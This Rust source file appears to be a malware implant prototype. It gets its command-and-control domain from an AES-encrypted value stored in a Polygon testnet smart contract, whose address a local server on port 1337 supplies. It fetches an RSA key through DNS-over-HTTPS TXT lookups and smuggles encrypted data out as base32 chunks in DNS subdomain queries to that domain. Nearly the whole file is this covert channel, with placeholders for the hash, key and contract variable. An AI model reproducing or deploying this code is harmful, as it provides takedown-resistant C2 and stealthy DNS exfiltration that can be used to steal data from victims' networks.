use std::net::{TcpStream,Shutdown};
use std::io::prelude::*;
use std::io::Result;
use ethers::prelude::*;
use ethers::providers::{Http, Middleware, Provider};
use std::str::FromStr;
use web3::contract::{Contract, Options};
use http::{Request, Response};
use url::{Url, ParseError};
use base64::{Engine as _, alphabet, engine::{self, general_purpose}};
use hex_literal::hex;
use generic_array::typenum::*;
use std::process;
use aes::Aes128;
use block_modes::{BlockMode, Cfb};
use block_modes::block_padding::Pkcs7;
use std::str;
use std::error::Error;
use std::env;
use base32::{Alphabet, decode, encode};
use rsa::{RsaPublicKey, pkcs8::DecodePublicKey, Oaep};
use sha2::{Sha256, Sha512, Digest};
type Aes128ECfb = Cfb<Aes128, Pkcs7>;
use rsa::PublicKey;

static Hash: &str = "UNIQUEHASH";
static ContractKey: &str = "SMARTCONTRACTKEY";
static TestnetRPC: &str = "https://endpoints.omniatech.io/v1/matic/mumbai/public";
use web3::{
    ethabi::ethereum_types::U256,
    types::{Address, TransactionParameters, H160},
};

use reqwest::blocking::Client;
use fancy_regex::Regex; 

fn parseCertificate(response: &str) -> String{
    let re = Regex::new(r"(?<==)(.*?)\\").unwrap();
    let mut result = String::new();

    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        result.push_str(&data);
    }
    return result.clone()

}

fn sendDnsRequest(domain: &str) -> Result<()>{
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "A");

    let client = Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    println!("{}",data);
    Ok(())
}

fn dnsRequestEncoder(domain: &str, message: &String){
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - dnsdomainNameSize;
    let mut packetOrder = 0;
    let base64Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &message.as_bytes()
    );
    let messageSize = base64Data.len();
    let mut messageRemainSize = messageSize;
    let mut lastPacket = 0;
    println!("Data: {}", base64Data);


    let mut result = String::new();
    println!("Max DNS request size: {} | DNS domain name size: {} | Max DNS data {}", dnsMAX, dnsdomainNameSize, maxDNSData);

    for (i, c) in base64Data.char_indices() {
        if i % 61 == 0 && i != 0{
            result.push('.');
        }
        if (result.len() >= (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-", packetOrder, result.len());
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
            sendDnsRequest(&result);
            result.clear();
        }
        result.push(c);
    }
    if lastPacket == 1{
        packetOrder += 1;
        let s = format!("-{}-{}-_", packetOrder, result.len());
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        sendDnsRequest(&result);
        result.clear();
    }


}

fn handleCertificate(domain: &str) -> Result<()>{
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "TXT");

    let client = Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();
    
    println!("[*] Public Key -> {:?}", data);
    println!("[*] DoH URL -> {:?}",url.as_str());

    let mut result = String::new();
    result = parseCertificate(&data);
    println!("Final Data Parse: {}", result);
    let decoded_bytes = decode(
        Alphabet::RFC4648 { padding: true },
        &result
    ).unwrap();

    let public_key = RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(&decoded_bytes)).unwrap();
    let padding = Oaep::new::<sha2::Sha256>();
    let mut rng = rand::thread_rng();

    let data = b"hello world";

    let enc_data = public_key.encrypt(&mut rng, padding, &data[..]).expect("failed to encrypt");

    println!("Decoded: {:?}", public_key);

    dnsRequestEncoder(domain, &String::from_utf8_lossy(&enc_data).to_string());

    Ok(())
}

#[tokio::main]
async fn rpcInteract(addr: &str) -> web3::Result<(web3::Result<()>, String)>{
    let transport = web3::transports::Http::new(TestnetRPC)?;
    let web3 = web3::Web3::new(transport);
    let smart_contract_addr = Address::from_str(addr).unwrap();

    let contractC2 = Contract::from_json(web3.eth(), smart_contract_addr, include_bytes!("/home/user/Desktop/babagola/ContractBuild/SmartContractDeployment_contracts_KxhLoDidOEMtRhTEwtlP_sol_KxhLoDidOEMtRhTEwtlP.abi"))
    .expect("deu ruim");
    let C2AESContent: String = contractC2
        .query("CONTRACTVARIABLENAME", (), None, Options::default(), None)
        .await
        .unwrap();

    let C2AESContent_b64dec = base64::decode(C2AESContent).unwrap();
    let key_dec = base64::decode(ContractKey).unwrap();

    let key = &key_dec[..];

    let iv = &C2AESContent_b64dec[..16];
    let message  = &C2AESContent_b64dec[16..];
    
    let mut buf = message.to_vec();

    let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();
    let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();

    let domain = String::from_utf8_lossy(decrypted_ciphertext);
    Ok((Ok(()), domain.to_string()))
}

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("127.0.0.1:1337")?;
    let mut smartContractAddressBuffer= [0; 42];

    stream.write(&Hash.as_bytes())?;
    stream.read(&mut smartContractAddressBuffer)?;
    stream.shutdown(Shutdown::Both);

    let smartContractAddress = std::str::from_utf8(&smartContractAddressBuffer).unwrap().trim_matches(char::from(0));
    println!("[*] Contract address -> {:?}", smartContractAddress);
    let rpcResponse = rpcInteract(smartContractAddress);


    match rpcResponse{
        Ok((_, domain)) =>{
            println!("[*] Domain -> {:?}", domain);
            handleCertificate(&domain);
        }
        Err(e) =>{
            process::exit(0);
        }
    }

    Ok(())
}
